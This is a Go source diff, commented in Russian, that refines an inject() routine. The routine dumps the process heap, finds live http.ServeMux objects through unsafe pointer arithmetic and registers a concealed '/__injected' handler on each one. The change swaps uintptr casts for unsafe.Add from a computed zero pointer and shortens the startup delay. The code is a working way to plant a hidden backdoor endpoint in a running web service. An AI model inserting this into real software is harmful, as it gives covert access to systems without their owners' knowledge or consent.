@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"net/http"
 	"os"
+	"reflect"
 	"runtime/debug"
 	"time"
 	"unsafe"
@@ -20,7 +21,7 @@ type pattern struct {
 func inject() {
 	go func() {
 		// Ждём,пока запустится сервис
-		time.Sleep(5 * time.Second)
+		time.Sleep(2 * time.Second)
 
 		// Создаем временный файл для дампа
 		f, err := os.CreateTemp(os.TempDir(), "*")
@@ -49,11 +50,12 @@ func inject() {
 		}
 
 		var (
-			muxSizeOf = unsafe.Sizeof(http.ServeMux{})
+			zeroPointer = getZeroPointer()
+			muxSizeOf   = unsafe.Sizeof(http.ServeMux{})
 
 			// https://go.dev/src/runtime/sizeclasses.go
-			muxSizeClass            = calculateSizeClass(int(muxSizeOf))
-			muxPatternOffset uint64 = 128
+			muxSizeClass     = calculateSizeClass(int(muxSizeOf))
+			muxPatternOffset = 128
 		)
 
 		for _, obj := range objects {
@@ -62,15 +64,21 @@ func inject() {
 			}
 
 			if len(obj.Contents) == muxSizeClass {
-				pattern := (*[]*pattern)(unsafe.Pointer(uintptr(obj.Address + muxPatternOffset)))
+				ptr := unsafe.Add(zeroPointer, obj.Address)
+				pattern := (*[]*pattern)(unsafe.Add(ptr, muxPatternOffset))
 				if pattern != nil && len(*pattern) > 0 && (*pattern)[0].str != "" {
-					mux := (*http.ServeMux)(unsafe.Pointer(uintptr(obj.Address)))
+					mux := (*http.ServeMux)(ptr)
 					mux.HandleFunc("/__injected", handleFunc)
 				}
 			}
 		}
 
 	}()
+}
+
+func getZeroPointer() unsafe.Pointer {
+	p := unsafe.Pointer(reflect.ValueOf(new(int)).Pointer())
+	return unsafe.Add(p, -uintptr(p))
 }
 
 func calculateSizeClass(n int) int {
